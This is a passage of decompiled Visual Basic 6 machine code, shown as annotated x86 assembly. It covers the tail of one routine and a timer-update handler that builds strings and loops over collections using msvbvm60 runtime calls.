008B7F23: mov eax, var_0000025C
008B7F29: mov eax, [eax]
008B7F2B: mov ecx, var_0000025C
008B7F31: mov ecx, [ecx]
008B7F33: mov ecx, [ecx]
008B7F35: push eax
008B7F36: call [ecx+00000550h]
008B7F3C: push eax
008B7F3D: lea eax, var_44
008B7F40: push eax
008B7F41: call 00410A84h ; Set (object)
008B7F46: push eax
008B7F47: lea eax, var_5C
008B7F4A: push eax
008B7F4B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7F50: add esp, 00000010h
008B7F53: push eax
008B7F54: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7F59: push eax
008B7F5A: lea eax, var_48
008B7F5D: push eax
008B7F5E: call 00410A84h ; Set (object)
008B7F63: push eax
008B7F64: lea eax, var_6C
008B7F67: push eax
008B7F68: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7F6D: add esp, 00000020h
008B7F70: push eax
008B7F71: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B7F76: push eax
008B7F77: lea eax, var_4C
008B7F7A: push eax
008B7F7B: call 00410A84h ; Set (object)
008B7F80: push eax
008B7F81: lea eax, var_7C
008B7F84: push eax
008B7F85: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B7F8A: add esp, 00000010h
008B7F8D: push eax
008B7F8E: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
008B7F93: sub ax, FFFFh
008B7F97: neg ax
008B7F9A: sbb eax, eax
008B7F9C: inc eax
008B7F9D: neg eax
008B7F9F: mov var_00000140, ax
008B7FA6: lea eax, var_4C
008B7FA9: push eax
008B7FAA: lea eax, var_48
008B7FAD: push eax
008B7FAE: lea eax, var_44
008B7FB1: push eax
008B7FB2: push 00000003h
008B7FB4: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B7FB9: add esp, 00000010h
008B7FBC: lea eax, var_7C
008B7FBF: push eax
008B7FC0: lea eax, var_6C
008B7FC3: push eax
008B7FC4: lea eax, var_5C
008B7FC7: push eax
008B7FC8: push 00000003h
008B7FCA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B7FCF: add esp, 00000010h
008B7FD2: movsx eax, word ptr var_00000140
008B7FD9: test eax, eax
008B7FDB: jz 008B81A8h
008B7FE1: mov var_04, 00000038h
008B7FE8: lea eax, var_30
008B7FEB: mov var_000000C8, eax
008B7FF1: mov var_000000D0, 0000400Ch
008B7FFB: cmp [008F2010h], 00000000h
008B8002: jnz 8B801Fh
008B8004: push 008F2010h
008B8009: push 00433984h
008B800E: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B8013: mov var_00000260, 008F2010h
008B801D: jmp 8B8029h
008B801F: mov var_00000260, 008F2010h
008B8029: push 00000000h
008B802B: push 00000014h
008B802D: push 00440E58h
008B8032: push 00000010h
008B8034: pop eax
008B8035: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B803A: lea esi, var_000000D0
008B8040: mov edi, esp
008B8042: movsd 
008B8043: movsd 
008B8044: movsd 
008B8045: movsd 
008B8046: push 00000001h
008B8048: push 00000000h
008B804A: push 00440E48h
008B804F: push 00000000h
008B8051: push 00000018h
008B8053: mov eax, var_00000260
008B8059: mov eax, [eax]
008B805B: mov ecx, var_00000260
008B8061: mov ecx, [ecx]
008B8063: mov ecx, [ecx]
008B8065: push eax
008B8066: call [ecx+00000550h]
008B806C: push eax
008B806D: lea eax, var_44
008B8070: push eax
008B8071: call 00410A84h ; Set (object)
008B8076: push eax
008B8077: lea eax, var_5C
008B807A: push eax
008B807B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8080: add esp, 00000010h
008B8083: push eax
008B8084: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8089: push eax
008B808A: lea eax, var_48
008B808D: push eax
008B808E: call 00410A84h ; Set (object)
008B8093: push eax
008B8094: lea eax, var_6C
008B8097: push eax
008B8098: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B809D: add esp, 00000020h
008B80A0: push eax
008B80A1: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B80A6: push eax
008B80A7: lea eax, var_4C
008B80AA: push eax
008B80AB: call 00410A84h ; Set (object)
008B80B0: push eax
008B80B1: lea eax, var_7C
008B80B4: push eax
008B80B5: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B80BA: add esp, 00000010h
008B80BD: push eax
008B80BE: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
008B80C3: mov edx, eax
008B80C5: lea ecx, var_3C
008B80C8: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B80CD: push eax
008B80CE: call 004109DCh ; Val(arg_1)
008B80D3: fstp real8 ptr var_0000013C
008B80D9: push 00000000h
008B80DB: push 00000000h
008B80DD: push 00000001h
008B80DF: push 00000000h
008B80E1: lea eax, var_000000C0
008B80E7: push eax
008B80E8: push 00000010h
008B80EA: push 00000880h
008B80EF: call 00410946h ; ReDim
008B80F4: add esp, 0000001Ch
008B80F7: mov var_000000D8, 00442930h
008B8101: mov var_000000E0, 00000008h
008B810B: lea esi, var_000000E0
008B8111: push 00000000h
008B8113: push var_000000C0
008B8119: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B811E: mov ecx, eax
008B8120: mov edx, esi
008B8122: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
008B8127: mov edx, 0043D9C0h ; x115
008B812C: lea ecx, var_40
008B812F: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B8134: lea eax, var_000000C0
008B813A: push eax
008B813B: lea eax, var_40
008B813E: push eax
008B813F: fld real8 ptr var_0000013C
008B8145: call 004108E6h ; msvbvm60.dll.__vbaFpI2
008B814A: push eax
008B814B: call 007A6910h
008B8150: lea eax, var_000000C0
008B8156: push eax
008B8157: push 00000000h
008B8159: call 00410934h ; Erase
008B815E: lea eax, var_40
008B8161: push eax
008B8162: lea eax, var_3C
008B8165: push eax
008B8166: push 00000002h
008B8168: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B816D: add esp, 0000000Ch
008B8170: lea eax, var_4C
008B8173: push eax
008B8174: lea eax, var_48
008B8177: push eax
008B8178: lea eax, var_44
008B817B: push eax
008B817C: push 00000003h
008B817E: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B8183: add esp, 00000010h
008B8186: lea eax, var_7C
008B8189: push eax
008B818A: lea eax, var_6C
008B818D: push eax
008B818E: lea eax, var_5C
008B8191: push eax
008B8192: push 00000003h
008B8194: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B8199: add esp, 00000010h
008B819C: mov var_04, 00000039h
008B81A3: call 0041096Ah ; DoEvents
008B81A8: mov var_04, 0000003Bh
008B81AF: lea eax, var_000001F0
008B81B5: push eax
008B81B6: lea eax, var_000001E0
008B81BC: push eax
008B81BD: lea eax, var_30
008B81C0: push eax
008B81C1: call 00410A36h ; Next
008B81C6: mov var_0000021C, eax
008B81CC: cmp var_0000021C, 00000000h
008B81D3: jnz 008B7EB1h
008B81D9: mov var_10, 00000000h
008B81E0: wait 
008B81E1: push 008B82BAh
008B81E6: jmp 8B8251h
008B81E8: lea eax, var_40
008B81EB: push eax
008B81EC: lea eax, var_3C
008B81EF: push eax
008B81F0: push 00000002h
008B81F2: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B81F7: add esp, 0000000Ch
008B81FA: lea eax, var_4C
008B81FD: push eax
008B81FE: lea eax, var_48
008B8201: push eax
008B8202: lea eax, var_44
008B8205: push eax
008B8206: push 00000003h
008B8208: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B820D: add esp, 00000010h
008B8210: lea eax, var_000000BC
008B8216: push eax
008B8217: lea eax, var_000000AC
008B821D: push eax
008B821E: lea eax, var_0000009C
008B8224: push eax
008B8225: lea eax, var_0000008C
008B822B: push eax
008B822C: lea eax, var_7C
008B822F: push eax
008B8230: lea eax, var_6C
008B8233: push eax
008B8234: lea eax, var_5C
008B8237: push eax
008B8238: push 00000007h
008B823A: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B823F: add esp, 00000020h
008B8242: lea eax, var_000000C0
008B8248: push eax
008B8249: push 00000000h
008B824B: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
008B8250: ret 
End Sub

Private sub tmrUpdate__8B8B66
008B8B66: push ebp
008B8B67: mov ebp, esp
008B8B69: sub esp, 0000000Ch
008B8B6C: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008B8B71: mov eax, fs:[00h]
008B8B77: push eax
008B8B78: mov fs:[00000000h], esp
008B8B7F: mov eax, 000001ACh
008B8B84: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008B8B89: push ebx
008B8B8A: push esi
008B8B8B: push edi
008B8B8C: mov var_0C, esp
008B8B8F: mov var_08, 0040EDB0h
008B8B96: mov eax, [ebp+08h]
008B8B99: and eax, 00000001h
008B8B9C: mov var_04, eax
008B8B9F: mov eax, [ebp+08h]
008B8BA2: and al, FEh
008B8BA4: mov [ebp+08h], eax
008B8BA7: mov eax, [ebp+08h]
008B8BAA: mov eax, [eax]
008B8BAC: push [ebp+08h]
008B8BAF: call [eax+04h]
008B8BB2: push 004412BCh
008B8BB7: push 00000000h
008B8BB9: push 00000007h
008B8BBB: mov eax, [ebp+08h]
008B8BBE: mov eax, [eax]
008B8BC0: push [ebp+08h]
008B8BC3: call [eax+0000031Ch]
008B8BC9: push eax
008B8BCA: lea eax, var_58
008B8BCD: push eax
008B8BCE: call 00410A84h ; Set (object)
008B8BD3: push eax
008B8BD4: lea eax, var_00000094
008B8BDA: push eax
008B8BDB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8BE0: add esp, 00000010h
008B8BE3: push eax
008B8BE4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8BE9: push eax
008B8BEA: lea eax, var_5C
008B8BED: push eax
008B8BEE: call 00410A84h ; Set (object)
008B8BF3: mov var_00000104, eax
008B8BF9: lea eax, var_00000100
008B8BFF: push eax
008B8C00: mov eax, var_00000104
008B8C06: mov eax, [eax]
008B8C08: push var_00000104
008B8C0E: call [eax+1Ch]
008B8C11: fclex 
008B8C13: mov var_00000108, eax
008B8C19: cmp var_00000108, 00000000h
008B8C20: jnl 8B8C42h
008B8C22: push 0000001Ch
008B8C24: push 004412BCh
008B8C29: push var_00000104
008B8C2F: push var_00000108
008B8C35: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8C3A: mov var_00000194, eax
008B8C40: jmp 8B8C49h
008B8C42: and var_00000194, 00000000h
008B8C49: xor eax, eax
008B8C4B: cmp var_00000100, 00000000h
008B8C52: setnle al
008B8C55: neg eax
008B8C57: mov var_0000010C, ax
008B8C5E: lea eax, var_5C
008B8C61: push eax
008B8C62: lea eax, var_58
008B8C65: push eax
008B8C66: push 00000002h
008B8C68: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B8C6D: add esp, 0000000Ch
008B8C70: lea ecx, var_00000094
008B8C76: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B8C7B: movsx eax, word ptr var_0000010C
008B8C82: test eax, eax
008B8C84: jz 008B92F0h
008B8C8A: mov var_000000D0, 00000001h
008B8C94: mov var_000000D8, 00000002h
008B8C9E: push 004412BCh
008B8CA3: push 00000000h
008B8CA5: push 00000007h
008B8CA7: mov eax, [ebp+08h]
008B8CAA: mov eax, [eax]
008B8CAC: push [ebp+08h]
008B8CAF: call [eax+0000031Ch]
008B8CB5: push eax
008B8CB6: lea eax, var_58
008B8CB9: push eax
008B8CBA: call 00410A84h ; Set (object)
008B8CBF: push eax
008B8CC0: lea eax, var_00000094
008B8CC6: push eax
008B8CC7: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8CCC: add esp, 00000010h
008B8CCF: push eax
008B8CD0: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8CD5: push eax
008B8CD6: lea eax, var_5C
008B8CD9: push eax
008B8CDA: call 00410A84h ; Set (object)
008B8CDF: mov var_00000104, eax
008B8CE5: lea eax, var_00000100
008B8CEB: push eax
008B8CEC: mov eax, var_00000104
008B8CF2: mov eax, [eax]
008B8CF4: push var_00000104
008B8CFA: call [eax+1Ch]
008B8CFD: fclex 
008B8CFF: mov var_00000108, eax
008B8D05: cmp var_00000108, 00000000h
008B8D0C: jnl 8B8D2Eh
008B8D0E: push 0000001Ch
008B8D10: push 004412BCh
008B8D15: push var_00000104
008B8D1B: push var_00000108
008B8D21: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8D26: mov var_00000198, eax
008B8D2C: jmp 8B8D35h
008B8D2E: and var_00000198, 00000000h
008B8D35: mov eax, var_00000100
008B8D3B: mov var_000000E0, eax
008B8D41: mov var_000000E8, 00000003h
008B8D4B: mov var_000000F0, 00000001h
008B8D55: mov var_000000F8, 00000002h
008B8D5F: lea eax, var_000000D8
008B8D65: push eax
008B8D66: lea eax, var_000000E8
008B8D6C: push eax
008B8D6D: lea eax, var_000000F8
008B8D73: push eax
008B8D74: lea eax, var_00000160
008B8D7A: push eax
008B8D7B: lea eax, var_00000150
008B8D81: push eax
008B8D82: lea eax, var_24
008B8D85: push eax
008B8D86: call 00410A3Ch ; For
008B8D8B: mov var_0000018C, eax
008B8D91: lea eax, var_5C
008B8D94: push eax
008B8D95: lea eax, var_58
008B8D98: push eax
008B8D99: push 00000002h
008B8D9B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B8DA0: add esp, 0000000Ch
008B8DA3: lea ecx, var_00000094
008B8DA9: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008B8DAE: jmp 008B92E1h
008B8DB3: push 004412BCh
008B8DB8: push 00000000h
008B8DBA: push 00000007h
008B8DBC: mov eax, [ebp+08h]
008B8DBF: mov eax, [eax]
008B8DC1: push [ebp+08h]
008B8DC4: call [eax+0000031Ch]
008B8DCA: push eax
008B8DCB: lea eax, var_58
008B8DCE: push eax
008B8DCF: call 00410A84h ; Set (object)
008B8DD4: push eax
008B8DD5: lea eax, var_00000094
008B8DDB: push eax
008B8DDC: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8DE1: add esp, 00000010h
008B8DE4: push eax
008B8DE5: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8DEA: push eax
008B8DEB: lea eax, var_5C
008B8DEE: push eax
008B8DEF: call 00410A84h ; Set (object)
008B8DF4: mov var_00000104, eax
008B8DFA: lea eax, var_60
008B8DFD: push eax
008B8DFE: lea eax, var_24
008B8E01: push eax
008B8E02: mov eax, var_00000104
008B8E08: mov eax, [eax]
008B8E0A: push var_00000104
008B8E10: call [eax+24h]
008B8E13: fclex 
008B8E15: mov var_00000108, eax
008B8E1B: cmp var_00000108, 00000000h
008B8E22: jnl 8B8E44h
008B8E24: push 00000024h
008B8E26: push 004412BCh
008B8E2B: push var_00000104
008B8E31: push var_00000108
008B8E37: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8E3C: mov var_0000019C, eax
008B8E42: jmp 8B8E4Bh
008B8E44: and var_0000019C, 00000000h
008B8E4B: mov eax, var_60
008B8E4E: mov var_0000010C, eax
008B8E54: lea eax, var_2C
008B8E57: push eax
008B8E58: mov eax, var_0000010C
008B8E5E: mov eax, [eax]
008B8E60: push var_0000010C
008B8E66: call [eax+24h]
008B8E69: fclex 
008B8E6B: mov var_00000110, eax
008B8E71: cmp var_00000110, 00000000h
008B8E78: jnl 8B8E9Ah
008B8E7A: push 00000024h
008B8E7C: push 004412DCh
008B8E81: push var_0000010C
008B8E87: push var_00000110
008B8E8D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8E92: mov var_000001A0, eax
008B8E98: jmp 8B8EA1h
008B8E9A: and var_000001A0, 00000000h
008B8EA1: push 004412BCh
008B8EA6: push 00000000h
008B8EA8: push 00000007h
008B8EAA: mov eax, [ebp+08h]
008B8EAD: mov eax, [eax]
008B8EAF: push [ebp+08h]
008B8EB2: call [eax+0000031Ch]
008B8EB8: push eax
008B8EB9: lea eax, var_64
008B8EBC: push eax
008B8EBD: call 00410A84h ; Set (object)
008B8EC2: push eax
008B8EC3: lea eax, var_000000A4
008B8EC9: push eax
008B8ECA: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8ECF: add esp, 00000010h
008B8ED2: push eax
008B8ED3: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8ED8: push eax
008B8ED9: lea eax, var_68
008B8EDC: push eax
008B8EDD: call 00410A84h ; Set (object)
008B8EE2: mov var_00000114, eax
008B8EE8: lea eax, var_6C
008B8EEB: push eax
008B8EEC: lea eax, var_24
008B8EEF: push eax
008B8EF0: mov eax, var_00000114
008B8EF6: mov eax, [eax]
008B8EF8: push var_00000114
008B8EFE: call [eax+24h]
008B8F01: fclex 
008B8F03: mov var_00000118, eax
008B8F09: cmp var_00000118, 00000000h
008B8F10: jnl 8B8F32h
008B8F12: push 00000024h
008B8F14: push 004412BCh
008B8F19: push var_00000114
008B8F1F: push var_00000118
008B8F25: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8F2A: mov var_000001A4, eax
008B8F30: jmp 8B8F39h
008B8F32: and var_000001A4, 00000000h
008B8F39: mov eax, var_6C
008B8F3C: mov var_0000011C, eax
008B8F42: lea eax, var_34
008B8F45: push eax
008B8F46: push 00000001h
008B8F48: mov eax, var_0000011C
008B8F4E: mov eax, [eax]
008B8F50: push var_0000011C
008B8F56: call [eax+00000084h]
008B8F5C: fclex 
008B8F5E: mov var_00000120, eax
008B8F64: cmp var_00000120, 00000000h
008B8F6B: jnl 8B8F90h
008B8F6D: push 00000084h
008B8F72: push 004412DCh
008B8F77: push var_0000011C
008B8F7D: push var_00000120
008B8F83: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B8F88: mov var_000001A8, eax
008B8F8E: jmp 8B8F97h
008B8F90: and var_000001A8, 00000000h
008B8F97: push 004412BCh
008B8F9C: push 00000000h
008B8F9E: push 00000007h
008B8FA0: mov eax, [ebp+08h]
008B8FA3: mov eax, [eax]
008B8FA5: push [ebp+08h]
008B8FA8: call [eax+0000031Ch]
008B8FAE: push eax
008B8FAF: lea eax, var_70
008B8FB2: push eax
008B8FB3: call 00410A84h ; Set (object)
008B8FB8: push eax
008B8FB9: lea eax, var_000000B4
008B8FBF: push eax
008B8FC0: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B8FC5: add esp, 00000010h
008B8FC8: push eax
008B8FC9: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B8FCE: push eax
008B8FCF: lea eax, var_74
008B8FD2: push eax
008B8FD3: call 00410A84h ; Set (object)
008B8FD8: mov var_00000124, eax
008B8FDE: lea eax, var_78
008B8FE1: push eax
008B8FE2: lea eax, var_24
008B8FE5: push eax
008B8FE6: mov eax, var_00000124
008B8FEC: mov eax, [eax]
008B8FEE: push var_00000124
008B8FF4: call [eax+24h]
008B8FF7: fclex 
008B8FF9: mov var_00000128, eax
008B8FFF: cmp var_00000128, 00000000h
008B9006: jnl 8B9028h
008B9008: push 00000024h
008B900A: push 004412BCh
008B900F: push var_00000124
008B9015: push var_00000128
008B901B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B9020: mov var_000001AC, eax
008B9026: jmp 8B902Fh
008B9028: and var_000001AC, 00000000h
008B902F: mov eax, var_78
008B9032: mov var_0000012C, eax
008B9038: lea eax, var_40
008B903B: push eax
008B903C: push 00000002h
008B903E: mov eax, var_0000012C
008B9044: mov eax, [eax]
008B9046: push var_0000012C
008B904C: call [eax+00000084h]
008B9052: fclex 
008B9054: mov var_00000130, eax
008B905A: cmp var_00000130, 00000000h
008B9061: jnl 8B9086h
008B9063: push 00000084h
008B9068: push 004412DCh
008B906D: push var_0000012C
008B9073: push var_00000130
008B9079: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B907E: mov var_000001B0, eax
008B9084: jmp 8B908Dh
008B9086: and var_000001B0, 00000000h
008B908D: push 004412BCh
008B9092: push 00000000h
008B9094: push 00000007h
008B9096: mov eax, [ebp+08h]
008B9099: mov eax, [eax]
008B909B: push [ebp+08h]
008B909E: call [eax+0000031Ch]
008B90A4: push eax
008B90A5: lea eax, var_7C
008B90A8: push eax
008B90A9: call 00410A84h ; Set (object)
008B90AE: push eax
008B90AF: lea eax, var_000000C4
008B90B5: push eax
008B90B6: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008B90BB: add esp, 00000010h
008B90BE: push eax
008B90BF: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008B90C4: push eax
008B90C5: lea eax, var_80
008B90C8: push eax
008B90C9: call 00410A84h ; Set (object)
008B90CE: mov var_00000134, eax
008B90D4: lea eax, var_00000084
008B90DA: push eax
008B90DB: lea eax, var_24
008B90DE: push eax
008B90DF: mov eax, var_00000134
008B90E5: mov eax, [eax]
008B90E7: push var_00000134
008B90ED: call [eax+24h]
008B90F0: fclex 
008B90F2: mov var_00000138, eax
008B90F8: cmp var_00000138, 00000000h
008B90FF: jnl 8B9121h
008B9101: push 00000024h
008B9103: push 004412BCh
008B9108: push var_00000134
008B910E: push var_00000138
008B9114: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B9119: mov var_000001B4, eax
008B911F: jmp 8B9128h
008B9121: and var_000001B4, 00000000h
008B9128: mov eax, var_00000084
008B912E: mov var_0000013C, eax
008B9134: lea eax, var_4C
008B9137: push eax
008B9138: push 00000003h
008B913A: mov eax, var_0000013C
008B9140: mov eax, [eax]
008B9142: push var_0000013C
008B9148: call [eax+00000084h]
008B914E: fclex 
008B9150: mov var_00000140, eax
008B9156: cmp var_00000140, 00000000h
008B915D: jnl 8B9182h
008B915F: push 00000084h
008B9164: push 004412DCh
008B9169: push var_0000013C
008B916F: push var_00000140
008B9175: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B917A: mov var_000001B8, eax
008B9180: jmp 8B9189h
008B9182: and var_000001B8, 00000000h
008B9189: push var_28
008B918C: push var_2C
008B918F: call 00410A18h ; &
008B9194: mov edx, eax
008B9196: lea ecx, var_30
008B9199: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B919E: push eax
008B919F: push 00441B30h
008B91A4: call 00410A18h ; &
008B91A9: mov edx, eax
008B91AB: lea ecx, var_38
008B91AE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B91B3: push eax
008B91B4: push var_34
008B91B7: call 00410A18h ; &
008B91BC: mov edx, eax
008B91BE: lea ecx, var_3C
008B91C1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B91C6: push eax
008B91C7: push 00441B30h
008B91CC: call 00410A18h ; &
008B91D1: mov edx, eax
008B91D3: lea ecx, var_44
008B91D6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B91DB: push eax
008B91DC: push var_40
008B91DF: call 00410A18h ; &
008B91E4: mov edx, eax
008B91E6: lea ecx, var_48
008B91E9: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B91EE: push eax
008B91EF: push 00441B30h
008B91F4: call 00410A18h ; &
008B91F9: mov edx, eax
008B91FB: lea ecx, var_50
008B91FE: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B9203: push eax
008B9204: push var_4C
008B9207: call 00410A18h ; &
008B920C: mov edx, eax
008B920E: lea ecx, var_54
008B9211: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B9216: push eax
008B9217: push 004413D8h
008B921C: call 00410A18h ; &
008B9221: mov edx, eax
008B9223: lea ecx, var_28
008B9226: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008B922B: lea eax, var_54
008B922E: push eax
008B922F: lea eax, var_4C
008B9232: push eax
008B9233: lea eax, var_50
008B9236: push eax
008B9237: lea eax, var_48
008B923A: push eax
008B923B: lea eax, var_40
008B923E: push eax
008B923F: lea eax, var_44
008B9242: push eax
008B9243: lea eax, var_3C
008B9246: push eax
008B9247: lea eax, var_34
008B924A: push eax
008B924B: lea eax, var_38
008B924E: push eax
008B924F: lea eax, var_30
008B9252: push eax
008B9253: lea eax, var_2C
008B9256: push eax
008B9257: push 0000000Bh
008B9259: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008B925E: add esp, 00000030h
008B9261: lea eax, var_00000084
008B9267: push eax
008B9268: lea eax, var_80
008B926B: push eax
008B926C: lea eax, var_7C
008B926F: push eax
008B9270: lea eax, var_78
008B9273: push eax
008B9274: lea eax, var_74
008B9277: push eax
008B9278: lea eax, var_70
008B927B: push eax
008B927C: lea eax, var_6C
008B927F: push eax
008B9280: lea eax, var_68
008B9283: push eax
008B9284: lea eax, var_64
008B9287: push eax
008B9288: lea eax, var_60
008B928B: push eax
008B928C: lea eax, var_5C
008B928F: push eax
008B9290: lea eax, var_58
008B9293: push eax
008B9294: push 0000000Ch
008B9296: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008B929B: add esp, 00000034h
008B929E: lea eax, var_000000C4
008B92A4: push eax
008B92A5: lea eax, var_000000B4
008B92AB: push eax
008B92AC: lea eax, var_000000A4
008B92B2: push eax
008B92B3: lea eax, var_00000094
008B92B9: push eax
008B92BA: push 00000004h
008B92BC: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008B92C1: add esp, 00000014h
008B92C4: lea eax, var_00000160
008B92CA: push eax
008B92CB: lea eax, var_00000150
008B92D1: push eax
008B92D2: lea eax, var_24
008B92D5: push eax
008B92D6: call 00410A36h ; Next
008B92DB: mov var_0000018C, eax
008B92E1: cmp var_0000018C, 00000000h
008B92E8: jnz 008B8DB3h
008B92EE: jmp 8B92FDh
008B92F0: mov edx, 00442930h
008B92F5: lea ecx, var_28
008B92F8: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B92FD: mov var_000000D0, 00000001h
008B9307: mov var_000000D8, 00000002h
008B9311: cmp [008F2010h], 00000000h
008B9318: jnz 8B9335h
008B931A: push 008F2010h
008B931F: push 00433984h
008B9324: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008B9329: mov var_000001BC, 008F2010h
008B9333: jmp 8B933Fh
008B9335: mov var_000001BC, 008F2010h
008B933F: mov eax, var_000001BC
008B9345: mov eax, [eax]
008B9347: mov ecx, var_000001BC
008B934D: mov ecx, [ecx]
008B934F: mov ecx, [ecx]
008B9351: push eax
008B9352: call [ecx+00000524h]
008B9358: push eax
008B9359: lea eax, var_58
008B935C: push eax
008B935D: call 00410A84h ; Set (object)
008B9362: mov var_00000104, eax
008B9368: lea eax, var_000000FC
008B936E: push eax
008B936F: mov eax, var_00000104
008B9375: mov eax, [eax]
008B9377: push var_00000104
008B937D: call [eax+48h]
008B9380: fclex 
008B9382: mov var_00000108, eax
008B9388: cmp var_00000108, 00000000h
008B938F: jnl 8B93B1h
008B9391: push 00000048h
008B9393: push 00440DE8h
008B9398: push var_00000104
008B939E: push var_00000108
008B93A4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008B93A9: mov var_000001C0, eax
008B93AF: jmp 8B93B8h
008B93B1: and var_000001C0, 00000000h
008B93B8: mov ax, var_000000FC
008B93BF: mov var_000000E0, ax
008B93C6: mov var_000000E8, 00000002h
008B93D0: mov var_000000F0, 00000001h
008B93DA: mov var_000000F8, 00000002h
008B93E4: lea eax, var_000000D8
008B93EA: push eax
008B93EB: lea eax, var_000000E8
008B93F1: push eax
008B93F2: lea eax, var_000000F8
008B93F8: push eax
008B93F9: lea eax, var_00000180
008B93FF: push eax
008B9400: lea eax, var_00000170
008B9406: push eax
008B9407: lea eax, var_24
008B940A: push eax
008B940B: call 00410A3Ch ; For
008B9410: mov var_00000190, eax
008B9416: lea ecx, var_58
008B9419: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008B941E: jmp 008B94CFh
008B9423: push 00000000h
008B9425: push 00000000h
008B9427: push 00000001h
008B9429: push 00000000h
008B942B: lea eax, var_000000C8
008B9431: push eax
008B9432: push 00000010h
008B9434: push 00000880h
008B9439: call 00410946h ; ReDim
008B943E: add esp, 0000001Ch
008B9441: lea eax, var_28
008B9444: mov var_000000D0, eax
008B944A: mov var_000000D8, 00004008h
008B9454: lea esi, var_000000D8
008B945A: push 00000000h
008B945C: push var_000000C8
008B9462: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
008B9467: mov ecx, eax
008B9469: mov edx, esi
008B946B: call 00410940h ; msvbvm60.dll.__vbaVarZero
008B9470: mov edx, 0043D9B0h ; x114
008B9475: lea ecx, var_2C
008B9478: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008B947D: lea eax, var_000000C8
008B9483: push eax
008B9484: lea eax, var_2C
008B9487: push eax
008B9488: lea eax, var_24
008B948B: push eax
008B948C: call 004109D0h ; msvbvm60.dll.__vbaI2Var
008B9491: push eax
008B9492: call 007A6910h
008B9497: lea eax, var_000000C8
008B949D: push eax
008B949E: push 00000000h
008B94A0: call 00410934h ; Erase
008B94A5: lea ecx, var_2C
008B94A8: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
008B94AD: call 0041096Ah ; DoEvents
008B94B2: lea eax, var_00000180
008B94B8: push eax
008B94B9: lea eax, var_00000170
008B94BF: push eax
008B94C0: lea eax, var_24
008B94C3: push eax
008B94C4: call 00410A36h ; Next
008B94C9: mov var_00000190, eax
008B94CF: cmp var_00000190, 00000000h
008B94D6: jnz 008B9423h
008B94DC: mov var_04, 00000000h
008B94E3: push 008B95CCh
008B94E8: jmp 008B9595h
008B94ED: lea eax, var_54
008B94F0: push eax
